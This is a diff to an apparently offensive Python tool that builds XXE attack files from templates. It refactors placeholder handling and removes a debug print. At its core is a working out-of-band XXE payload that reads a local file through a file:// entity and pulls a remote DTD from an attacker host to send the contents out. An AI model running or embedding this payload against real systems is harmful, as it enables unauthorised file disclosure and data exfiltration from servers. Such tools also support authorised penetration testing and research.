@@ -3,10 +3,7 @@ import argparse
 payloads = {
     "rdtd": {
         "description": "A Remote DTD causes the XML parser to make an external connection when successful.",
-        "payload": '<!DOCTYPE root [ <!ENTITY % start "<![CDATA["><!ENTITY % stuff SYSTEM "file://{0}"><!ENTITY % end "]]>"><!ENTITY % dtd SYSTEM "{1}://{2}">%dtd;]>'.format(
-            self.exfile, 
-            self.protocol + self.host
-        ),
+        "payload": '<!DOCTYPE root [ <!ENTITY % start "<![CDATA["><!ENTITY % stuff SYSTEM "file://__EXFILE__"><!ENTITY % end "]]>"><!ENTITY % dtd SYSTEM "__PROTOCOL____HOST__">%dtd;]>',
         "entity": "&xxe;",
     }
 }
@@ -53,11 +50,19 @@ class XXeFile:
     def generate_payload(self):
         with open(self.template, "rb") as tmpl:
             tempdat = tmpl.read().decode("utf8")
-            if "IP" in self.payload:
+            if "__HOST__" in self.payload:
                 self.payload = self.payload.replace(
-                    "IP", self.protocol + self.host
+                    "__HOST__", self.host
                 )
-            tempdat = tempdat.replace("PAYLOAD", self.payload)
+            if "__PROTOCOL__" in self.payload:
+                self.payload = self.payload.replace(
+                    "__PROTOCOL__", self.protocol
+                )
+            if "__EXFILE__" in self.payload:
+                self.payload = self.payload.replace(
+                    "__EXFILE__", self.exfile
+                )
+            tempdat = tempdat.replace("__PAYLOAD__", self.payload)
             return tempdat
 
     @property
@@ -103,7 +108,6 @@ def main():
         args.host, args.protocol, args.type, args.payload, args.outfile, args.exfile
     )
 
-    print(obj.host, obj.protocol, obj.payload, obj.template)
     if obj.outfile is None:
         obj.to_text
     else:
